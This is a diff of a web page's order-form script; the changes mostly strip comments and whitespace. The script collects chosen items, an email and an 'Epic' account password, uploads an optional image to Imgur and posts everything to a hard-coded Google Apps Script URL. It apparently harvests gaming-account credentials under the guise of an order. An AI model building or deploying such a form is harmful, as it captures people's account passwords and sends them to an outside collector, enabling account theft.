@@ -62,11 +62,10 @@
           </div>
         </div>
       </footer>
-      <script>
+<script>
 document.getElementById('orderForm').addEventListener('submit', async function (e) {
-  e.preventDefault(); // Prevent the default form submission
-  
-  // Collect form data
+  e.preventDefault();
+
   const items = Array.from(document.querySelectorAll('.item:checked'))
     .map(item => item.dataset.name)
     .join(', ');
@@ -76,8 +75,7 @@ document.getElementById('orderForm').addEventListener('submit', async function (
   const epicEmail = document.getElementById('email').value;
   const epicPassword = document.getElementById('pass').value;
   const image = document.getElementById('image').files[0];
-  
-  // Optional: Upload image to Imgur
+
   let imageURL = '';
   if (image) {
     const formData = new FormData();
@@ -92,8 +90,7 @@ document.getElementById('orderForm').addEventListener('submit', async function (
     const imgurData = await imgurResponse.json();
     imageURL = imgurData.data.link || '';
   }
-  
-  // Submit order data to Google Apps Script
+
   fetch('https://script.google.com/macros/s/AKfycbzBsxKL0_NUdTO5sNEGC2K7y8ieK9LrG_oM3diV9thWsGpMp05PHCEWkUM50o34kuSw/exec', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -120,9 +117,8 @@ document.getElementById('orderForm').addEventListener('submit', async function (
       alert('Error communicating with the server.');
     });
 });
+</script>
 
-
-      </script>
       
 </body>
 </html>
